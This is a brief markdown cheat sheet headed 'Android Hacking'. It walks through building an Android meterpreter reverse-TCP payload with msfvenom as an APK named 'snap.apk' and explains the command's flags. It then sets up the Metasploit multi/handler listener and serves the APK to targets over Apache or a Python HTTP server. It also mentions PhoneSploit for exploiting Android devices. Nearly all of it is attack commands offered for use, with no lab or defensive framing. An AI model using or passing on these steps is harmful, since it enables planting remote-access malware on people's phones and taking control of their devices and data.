# Android Hacking
```
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Local IP> LPORT=<Local Port> R > snap.apk
```

-p --> Payload
--platform --> Android/Win/Linux
-a --> Architecture --> x86/x86_64/dalvik
R --> Raw File
f --> Format Output


### Msfconsole

- Set up the Handler First
```
use exploit/multi/handler
```
- Set up the Payload

```
use android/meterpreter/reverse_tcp
```
- Set LHOST
- Set LPORT
- Exploit 

### Downloading and Installing The APK
Use Apache Service or Python SimpleHTTP Server to share the payload file.

> service apache2 start

> python3 -m http.server 8080

> python2 -m SimpleHttpServer 8080

Moreover PhoneSploit can also be used to connect/exploit an android device.